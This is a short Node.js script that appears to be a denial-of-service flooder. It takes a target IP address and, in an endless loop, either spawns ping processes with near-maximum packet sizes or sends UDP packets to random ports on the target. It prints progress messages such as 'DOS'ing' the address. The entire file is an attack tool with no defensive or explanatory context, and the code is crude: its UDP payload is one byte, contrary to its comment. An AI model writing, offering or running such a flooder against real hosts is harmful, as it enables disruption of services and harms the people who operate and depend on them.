const { spawn } = require('child_process')
let ip = process.argv[2]
console.log(`DOS'ing ${ip}...`)
let args;
if(process.platform == 'win32') {
    args = [ip, '-l', '65500']
} else {
    args = [ip, '-s', '65507']
}
let j = 0
function spawnD(ip, udp) {
    
    //send udp packets to ${ip} with a payload of 65507 bytes
    //on random ports
    function usePing() {
        spawn('ping', args)
        console.log(`Spawned ${j} process's`)
    }
    function useUdp(){
        var dgram = require('dgram');
        var client = dgram.createSocket('udp4');
        msg = new Buffer ([
            0x08]);
            //let rPort = random number from 1 to 65536
        let rPort = Math.floor(Math.random() * 65535) + 1
            
        client.send(msg, 0, msg.length, rPort, ip, function(err){
            if(err) throw err;
            console.log(`Spawned ${j} process's | UDP packet sent to ${ip} on port ${rPort}`)
        });
        }
    if(udp === 'true') {
        useUdp()

    } else {
        usePing()
    }

    j++
}

if(process.argv[3] === 'true') {
    console.log('Using udp flooding...')
} else {
    console.log('Using ping flooding...')
}
while(true) {
    spawnD(ip, process.argv[3])
} 